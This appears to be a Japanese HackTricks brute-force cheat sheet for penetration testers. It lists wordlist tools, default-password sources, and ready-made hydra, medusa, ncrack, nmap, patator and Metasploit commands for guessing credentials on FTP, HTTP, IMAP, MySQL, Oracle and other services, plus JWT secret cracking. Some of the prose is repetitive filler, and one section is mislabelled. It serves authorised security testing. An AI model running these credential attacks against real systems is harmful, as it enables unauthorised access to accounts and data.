# ブルートフォース - チートシート

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**し、自動化します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksをPDFでダウンロードしたいですか？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>

## デフォルトの資格情報

使用されている技術のデフォルトの資格情報を**Googleで検索**するか、次のリンクを試してみてください：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is a tool used for generating custom wordlists by scraping websites or documents. It can be helpful in performing brute force attacks by creating wordlists based on the target's specific interests or preferences.

To use Cewl, you need to provide it with a starting URL or a file containing text. It will then crawl the website or analyze the document to extract words and phrases. By applying various filters and options, you can customize the wordlist generation process to suit your needs.

Cewl can be particularly useful when targeting individuals or organizations with specific interests or when trying to crack passwords based on personal information. By creating wordlists that are tailored to the target, you increase the chances of success in a brute force attack.

To run Cewl, you can use the following command:

```
cewl [options] <URL or file>
```

Some common options include:

- `-d`: Set the depth of the crawl (default is 2).
- `-m`: Set the minimum word length (default is 3).
- `-w`: Specify the output file for the wordlist.

Cewl is a powerful tool that can enhance the effectiveness of brute force attacks by generating targeted wordlists. However, it is important to use it responsibly and ethically, ensuring that you have proper authorization before conducting any penetration testing activities.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

被害者の情報（名前、日付など）に基づいてパスワードを生成します。
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wisterは、単語リスト生成ツールであり、特定のターゲットに関連する使用するためのユニークで理想的な単語リストを作成するために、与えられた単語から複数のバリエーションを作成することができます。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### ワードリスト

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## サービス

サービス名でアルファベット順に並べられます。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a protocol used by the Apache Tomcat web server to communicate with other web servers or servlet containers. It is similar to the HTTP protocol but is more efficient for handling Java-based applications.

A common attack method against AJP is brute force, where an attacker attempts to guess the username and password combination to gain unauthorized access to the server. Brute force attacks can be automated using tools like Hydra or Burp Suite.

To protect against brute force attacks on AJP, it is important to use strong and unique passwords for all user accounts. Additionally, implementing account lockout policies can help prevent repeated login attempts. Monitoring server logs for suspicious activity and implementing rate limiting can also be effective in mitigating brute force attacks.

It is recommended to regularly update the Apache Tomcat server and any associated software to ensure that known vulnerabilities are patched. Regular security audits and penetration testing can also help identify and address any potential weaknesses in the server configuration.

By following these best practices, you can enhance the security of your AJP-enabled web server and reduce the risk of unauthorized access.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
# ブルートフォース攻撃

ブルートフォース攻撃は、暗号化されたデータを解読するために使用される一般的な攻撃手法です。この攻撃手法では、すべての可能な組み合わせを試し、正しいパスワードや鍵を見つけることを目指します。

## ブルートフォース攻撃の手法

ブルートフォース攻撃にはいくつかの手法があります。

1. 辞書攻撃: 事前に作成された辞書ファイルを使用して、一連の単語やフレーズを試します。一般的なパスワードや一般的なフレーズを使用している場合、この攻撃手法は効果的です。

2. 総当たり攻撃: すべての可能な組み合わせを順番に試します。この攻撃手法は非常に時間がかかるため、短いパスワードや短い鍵の場合にのみ有効です。

3. ハイブリッド攻撃: 辞書攻撃と総当たり攻撃を組み合わせた攻撃手法です。まず辞書攻撃を試し、成功しない場合に総当たり攻撃に移ります。

## ブルートフォース攻撃のリソース

ブルートフォース攻撃を実行するためには、いくつかのリソースが必要です。

1. パフォーマンスの高いハードウェア: ブルートフォース攻撃は非常に計算量が多いため、高性能なハードウェアが必要です。

2. 辞書ファイル: ブルートフォース攻撃に使用する辞書ファイルは、一連の一般的な単語やフレーズを含んでいます。

3. ブルートフォース攻撃ツール: ブルートフォース攻撃を自動化するためのツールが必要です。これにより、大量の組み合わせを効率的に試すことができます。

## ブルートフォース攻撃の対策

ブルートフォース攻撃からデータを保護するためには、いくつかの対策を講じることが重要です。

1. 強力なパスワードポリシーの実施: パスワードは長く、複雑で予測困難なものにする必要があります。

2. ログイン試行回数の制限: ログイン試行回数を制限することで、ブルートフォース攻撃を防ぐことができます。

3. 2要素認証の使用: 2要素認証を使用することで、追加のセキュリティレイヤーを提供することができます。

4. ブルートフォース攻撃の検知と防止: ブルートフォース攻撃を検知し、適切な対策を講じるためのセキュリティツールを使用することが重要です。

以上がブルートフォース攻撃に関する基本的な情報です。これらの手法と対策を理解し、適切なセキュリティ対策を講じることが重要です。
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDBは、ドキュメント指向のデータベースであり、HTTPプロトコルを使用してデータにアクセスすることができます。CouchDBは、データベースのブルートフォース攻撃に対して脆弱な場合があります。ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証トークンなどの正しい値を推測するために、連続して多数の試行を行います。

CouchDBのブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

1. 強力なパスワードポリシーを実施する：パスワードは長く、複雑な文字列である必要があります。大文字、小文字、数字、特殊文字を組み合わせることで、推測されにくいパスワードを作成することができます。

2. ログイン試行回数の制限：ログイン試行回数を制限することで、ブルートフォース攻撃を防ぐことができます。一定回数の試行が失敗した場合、アカウントを一時的にロックするなどの対策を講じることができます。

3. IPアドレスの制限：特定のIPアドレスからのアクセスのみを許可することで、不正なアクセスを制限することができます。正当なユーザーのみがアクセスできるようにするため、ホワイトリストを使用することが推奨されます。

4. セキュリティパッチの適用：CouchDBの最新のセキュリティパッチを適用することで、既知の脆弱性を修正することができます。定期的なパッチ適用は、セキュリティの向上に不可欠です。

これらの対策を講じることで、CouchDBのブルートフォース攻撃に対するセキュリティを強化することができます。
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
## Docker レジストリ

A Docker registry is a storage and distribution system for Docker images. It allows you to store and manage your Docker images in a central location, making it easy to share and deploy them across different environments.

Docker レジストリは、Docker イメージの保存と配布のためのストレージおよび配布システムです。これにより、Docker イメージを中央の場所に保存および管理することができ、異なる環境で簡単に共有および展開することができます。

### Brute Force Attacks

Brute force attacks are a common method used by hackers to gain unauthorized access to a system or account. In a brute force attack, the hacker systematically tries all possible combinations of passwords or encryption keys until the correct one is found.

Brute force attacks can be time-consuming and resource-intensive, but they can be effective if the target system has weak or easily guessable passwords. To protect against brute force attacks, it is important to use strong, unique passwords and implement account lockout policies.

### ブルートフォース攻撃

ブルートフォース攻撃は、ハッカーがシステムやアカウントへの不正アクセスを試みるために使用する一般的な手法です。ブルートフォース攻撃では、ハッカーはパスワードや暗号化キーのすべての可能な組み合わせを順番に試し、正しいものを見つけるまで続けます。

ブルートフォース攻撃は時間とリソースを消費する可能性がありますが、対象システムが弱いパスワードや容易に推測可能なパスワードを使用している場合には効果的です。ブルートフォース攻撃に対抗するためには、強力で一意なパスワードを使用し、アカウントロックアウトポリシーを実装することが重要です。
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch is a distributed, RESTful search and analytics engine built on top of Apache Lucene. It provides a scalable solution for storing, searching, and analyzing large volumes of data in real-time.

## Brute Force Attacks

Brute force attacks are a common method used by hackers to gain unauthorized access to systems or accounts. In a brute force attack, the hacker systematically tries all possible combinations of usernames and passwords until the correct one is found.

### Brute Forcing Elasticsearch

Brute forcing Elasticsearch involves attempting to guess the credentials of an Elasticsearch cluster in order to gain unauthorized access. This can be done by using automated tools that systematically try different combinations of usernames and passwords.

To protect against brute force attacks on Elasticsearch, it is important to follow security best practices such as:

- Using strong, complex passwords that are not easily guessable.
- Implementing account lockout policies that temporarily lock an account after a certain number of failed login attempts.
- Enabling Elasticsearch's built-in security features, such as role-based access control (RBAC) and SSL/TLS encryption.

Additionally, monitoring and logging can help detect and mitigate brute force attacks. By monitoring Elasticsearch logs and network traffic, suspicious activity can be identified and appropriate action can be taken.

## Conclusion

Brute force attacks are a serious threat to the security of Elasticsearch clusters. By implementing strong security measures and following best practices, the risk of unauthorized access can be significantly reduced.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP（File Transfer Protocol）は、ファイルをサーバーとクライアント間で転送するためのプロトコルです。FTPサーバーには、ファイルのアップロードやダウンロードを行うための認証情報が必要です。一般的な認証方法には、ユーザー名とパスワードの組み合わせがあります。

ブルートフォース攻撃は、FTPサーバーへのアクセスを試みる際に使用される一般的な攻撃手法の1つです。この攻撃では、ハッカーは自動化されたツールを使用して、さまざまなユーザー名とパスワードの組み合わせを試し、正しい認証情報を見つけ出そうとします。

ブルートフォース攻撃は、パスワードが弱い場合や、ユーザー名とパスワードの組み合わせが予測しやすい場合に特に効果的です。ハッカーは、辞書攻撃やランダムな文字列の組み合わせを使用して、可能なすべての認証情報を試すことができます。

FTPサーバーのブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、ユーザーが予測しにくいパスワードを使用するように促すことが重要です。また、アカウントロックアウトやIP制限などのセキュリティメカニズムを設定することも有効です。

FTPサーバーのセキュリティを向上させるためには、より安全なプロトコルであるSFTP（Secure File Transfer Protocol）やFTPS（FTP over SSL/TLS）を検討することも重要です。これらのプロトコルは、データの暗号化や認証情報の安全な転送を提供します。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTPジェネリックブルート

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTPベーシック認証
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - ポストフォーム

Brute forcing a login form is a common technique used to gain unauthorized access to a web application. In this method, an attacker systematically tries different combinations of usernames and passwords until a successful login is achieved.

To perform a brute force attack on an HTTP POST form, the following steps can be followed:

1. Identify the login form: Inspect the HTML source code of the login page to locate the form element that accepts the username and password.

2. Prepare a wordlist: Create a list of possible usernames and passwords that will be used for the brute force attack. This list can be generated using common passwords, dictionary words, or custom combinations.

3. Automate the attack: Use a scripting language or a tool like Burp Suite to automate the process of sending POST requests to the login form. The script or tool should iterate through the wordlist, sending a request for each combination of username and password.

4. Handle response codes: Analyze the response codes received from the server after each request. A successful login attempt will typically result in a redirect or a specific response code indicating a successful authentication.

5. Implement rate limiting: To avoid detection and potential account lockouts, it is important to implement rate limiting in the brute force attack. This can be done by introducing delays between each request or by limiting the number of requests per minute.

6. Monitor and analyze logs: Keep track of the login attempts and monitor the server logs for any suspicious activity. This will help in identifying any successful login attempts or potential security breaches.

It is important to note that brute forcing a login form is a time-consuming process and may not always be successful. Web applications often have security measures in place, such as account lockouts or CAPTCHA, to prevent brute force attacks. Additionally, brute forcing is an illegal activity unless performed with proper authorization for penetration testing purposes.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
http**s**の場合は、「http-post-form」を「**https-post-form」に変更する必要があります。

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
IMAP (Internet Message Access Protocol) is a widely used protocol for email retrieval. It allows users to access their email messages on a remote mail server. IMAP supports both online and offline modes, allowing users to manage their email messages even when they are not connected to the server.

#### Brute-Forcing IMAP Credentials

Brute-forcing is a common technique used to gain unauthorized access to IMAP accounts. It involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found.

To perform a brute-force attack on an IMAP server, you can use tools like Hydra or Medusa. These tools automate the process of trying different username and password combinations, making it easier to find the correct credentials.

Before launching a brute-force attack, it is important to gather information about the target, such as the email domain and common usernames. This information can be obtained through reconnaissance techniques like OSINT (Open Source Intelligence) or social engineering.

Once you have the necessary information, you can start the brute-force attack by specifying the target's IP address or domain, the IMAP port (usually 143 or 993 for SSL/TLS), and the list of usernames and passwords to try. The tool will then systematically try each combination until it finds the correct credentials.

To increase the chances of success, you can use wordlists that contain commonly used passwords or perform a dictionary attack using a list of words from a specific language. It is also possible to customize the attack by specifying additional parameters, such as the maximum number of login attempts per minute or the delay between each attempt.

It is important to note that brute-forcing is an illegal activity unless you have explicit permission from the target to perform the attack. Unauthorized access to someone's email account is a serious offense and can lead to legal consequences.

#### Mitigating Brute-Force Attacks

To protect against brute-force attacks on IMAP accounts, there are several measures that can be taken:

1. Implement account lockout policies: After a certain number of failed login attempts, lock the account for a specified period of time to prevent further brute-force attempts.

2. Use strong and unique passwords: Encourage users to choose passwords that are difficult to guess and not used for other accounts. Implement password complexity requirements and enforce regular password changes.

3. Enable two-factor authentication (2FA): Require users to provide an additional verification factor, such as a code sent to their mobile device, in addition to their password.

4. Monitor for suspicious activity: Implement logging and monitoring mechanisms to detect and alert on multiple failed login attempts or unusual login patterns.

5. Limit login attempts: Implement rate limiting mechanisms to restrict the number of login attempts per minute from a single IP address.

By implementing these measures, the risk of successful brute-force attacks can be significantly reduced, enhancing the security of IMAP accounts.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC（Internet Relay Chat）は、インターネット上でリアルタイムのテキストベースのコミュニケーションを可能にするプロトコルです。IRCは、チャットルームと呼ばれるグループチャットの形式を提供し、ユーザーはテキストメッセージを送信し、他のユーザーと対話することができます。

IRCサーバーに対するブルートフォース攻撃は、パスワードを推測するために自動化された方法を使用して行われます。攻撃者は、一連の一般的なパスワードや辞書攻撃を使用して、正しいパスワードを見つけることを試みます。

ブルートフォース攻撃は、パスワードの弱さに依存しており、強力なパスワードを使用することで防ぐことができます。また、アカウントロックアウトやCAPTCHAなどのセキュリティメカニズムを実装することも有効です。

IRCサーバーのブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施する
- パスワードの定期的な変更を促す
- ログイン試行回数の制限を設定する
- ログインアクティビティの監視を行う
- セキュリティパッチの適用を定期的に行う

これらの対策を実施することで、IRCサーバーへのブルートフォース攻撃を防ぐことができます。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) is a protocol that allows the transmission of SCSI commands over IP networks. It enables the use of storage devices over a network, making it possible to access remote storage resources as if they were local.

iSCSI works by encapsulating SCSI commands into IP packets, which are then transmitted over TCP/IP networks. This allows for the remote mounting of storage devices, such as disks or tape drives, on a client system.

One of the advantages of iSCSI is its flexibility and compatibility with existing infrastructure. It can be used with both Ethernet and Fibre Channel networks, and can leverage existing IP-based networks. This makes it a cost-effective solution for organizations that want to extend their storage capabilities without investing in additional hardware.

However, the use of iSCSI also introduces security risks. Since iSCSI traffic is transmitted over IP networks, it is susceptible to interception and unauthorized access. To mitigate these risks, it is important to implement security measures such as authentication, encryption, and access control.

Overall, iSCSI is a powerful protocol that enables the efficient and flexible use of storage resources over a network. By understanding its capabilities and implementing appropriate security measures, organizations can leverage iSCSI to enhance their storage infrastructure.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
JWT（JSON Web Token）は、認証と情報の安全な伝送を可能にするためのオープンスタンダードです。JWTは、クライアントとサーバー間でデータを安全にやり取りするために使用されます。JWTは、ユーザーの認証情報やその他の情報を含むJSON形式のトークンです。

JWTは、3つのセクションから構成されています。ヘッダー、ペイロード、署名です。ヘッダーは、トークンのタイプや使用するアルゴリズムなどのメタデータを含みます。ペイロードは、トークンに含まれる情報を格納します。署名は、トークンの信頼性を確保するために使用されます。

JWTの一般的な攻撃手法の1つは、ブルートフォース攻撃です。ブルートフォース攻撃では、攻撃者は可能なすべての組み合わせを試し、正しい署名を見つけることを試みます。これにより、攻撃者はトークンを改ざんしたり、不正なアクセスを行ったりすることができます。

ブルートフォース攻撃を防ぐためには、強力なパスワードや署名アルゴリズムを使用することが重要です。また、トークンの有効期限を短く設定することも推奨されます。さらに、アカウントロックアウトやCAPTCHAなどのセキュリティメカニズムを実装することも有効です。

JWTのセキュリティを確保するためには、適切な暗号化と署名の実装が必要です。また、トークンの検証や不正なトークンの検出などのセキュリティチェックも重要です。
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP（Lightweight Directory Access Protocol）は、ディレクトリサービスにアクセスするためのプロトコルです。ディレクトリサービスは、ユーザー、グループ、コンピュータなどの情報を格納し、検索や認証などの操作を提供します。

LDAPのブルートフォース攻撃は、辞書攻撃とも呼ばれ、ユーザー名とパスワードの組み合わせを総当たりで試行し、正しい認証情報を見つけることを目指します。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

ブルートフォース攻撃は、自動化ツールを使用して実行することができます。これにより、大量のユーザーアカウントを効率的に攻撃することができます。攻撃者は、一般的なパスワードや辞書に基づいたパスワードを試すことができます。

LDAPサーバーのブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを要求することが重要です。また、アカウントロックアウトポリシーを設定することで、一定回数の認証失敗後にアカウントをロックすることも有効です。

ブルートフォース攻撃は、セキュリティテストやペネトレーションテストの一環として使用されることもあります。これにより、システムの脆弱性を特定し、適切な対策を講じることができます。
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT（Message Queuing Telemetry Transport）は、軽量なメッセージングプロトコルであり、IoT（Internet of Things）デバイス間の通信に広く使用されています。このプロトコルは、低帯域幅や不安定なネットワーク環境でも効率的に動作します。

MQTTは、パブリッシャーとサブスクライバーの2つの役割を持つクライアント間の非同期通信を可能にします。パブリッシャーはメッセージをトピックにパブリッシュし、サブスクライバーは特定のトピックにサブスクライブしてメッセージを受信します。

MQTTのセキュリティには注意が必要です。デフォルトの設定では、認証や暗号化が行われないため、攻撃者がメッセージを傍受したり改ざんしたりする可能性があります。したがって、セキュリティを強化するためには、TLS（Transport Layer Security）を使用した暗号化通信や、ユーザー認証などの対策を講じる必要があります。

MQTTのブルートフォース攻撃は、パスワードの推測や辞書攻撃を使用して、認証情報を解読しようとするものです。この攻撃を防ぐためには、強力なパスワードポリシーを実装し、パスワードの複雑さを確保する必要があります。また、認証失敗の回数制限やアカウントロックアウトの機能を有効にすることも重要です。

MQTTのセキュリティを確保するためには、最新のバージョンのプロトコルを使用し、セキュリティパッチを定期的に適用することも重要です。また、ネットワークトラフィックの監視や不審なアクティビティの検知にも注意を払う必要があります。
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
# ブルートフォース攻撃

ブルートフォース攻撃は、Mongoデータベースに対して非常に効果的な攻撃手法です。この攻撃手法では、すべての可能なパスワードの組み合わせを試し、正しいパスワードを見つけることを目指します。

以下は、Mongoデータベースに対するブルートフォース攻撃の手順です。

1. ユーザー名のリストを取得します。
2. パスワードのリストを取得します。
3. ユーザー名とパスワードの組み合わせを作成します。
4. 作成した組み合わせを使用してMongoデータベースにログインを試みます。
5. 正しい組み合わせが見つかるまで、ステップ4を繰り返します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、強力なパスワードを使用している場合には成功する可能性が低くなります。したがって、セキュリティを強化するためには、強力なパスワードポリシーを採用することが重要です。

また、ブルートフォース攻撃を防ぐためには、以下の対策を講じることが推奨されます。

- パスワードの複雑さを増す
- ログイン試行回数の制限を設定する
- 2要素認証を使用する

以上がMongoデータベースに対するブルートフォース攻撃に関する情報です。セキュリティを強化するためには、適切な対策を講じることが重要です。
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQLは、オープンソースのリレーショナルデータベース管理システムであり、多くのウェブアプリケーションやウェブサイトで使用されています。MySQLデータベースに対するブルートフォース攻撃は、一般的な攻撃手法の1つです。

ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードを推測するために連続的に試行する手法です。攻撃者は、一連のパスワードを自動的に生成し、それらをデータベースに対して試行します。正しいパスワードが見つかるまで、攻撃者は繰り返し試行を行います。

MySQLデータベースに対するブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施し、複雑なパスワードを使用する。
- パスワードの定期的な変更を促す。
- ログイン試行回数の制限を設定する。
- IPアドレスベースのアクセス制御リストを使用する。
- ファイアウォールを使用して不正なアクセスをブロックする。

これらの対策を実施することで、MySQLデータベースへのブルートフォース攻撃を防ぐことができます。
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Brute Force

Brute force is a common method used in penetration testing to crack passwords or encryption keys by systematically trying all possible combinations until the correct one is found. This technique is often used when other methods, such as dictionary attacks or rainbow table attacks, are not successful.

In the context of Oracle SQL, brute force can be used to gain unauthorized access to a database by guessing the username and password combination. This can be done by using automated tools or scripts that iterate through a list of commonly used usernames and passwords, or by manually trying different combinations.

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockout policies, and monitor for suspicious login attempts. Additionally, using two-factor authentication can add an extra layer of security by requiring a second form of verification, such as a code sent to a mobile device, in addition to the username and password.

While brute force attacks can be effective, they can also be time-consuming and resource-intensive. Therefore, it is important for organizations to regularly assess and strengthen their security measures to mitigate the risk of brute force attacks.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
**oracle_login**を**patator**と一緒に使用するためには、以下の手順で**インストール**する必要があります:
```bash
pip3 install cx_Oracle --upgrade
```
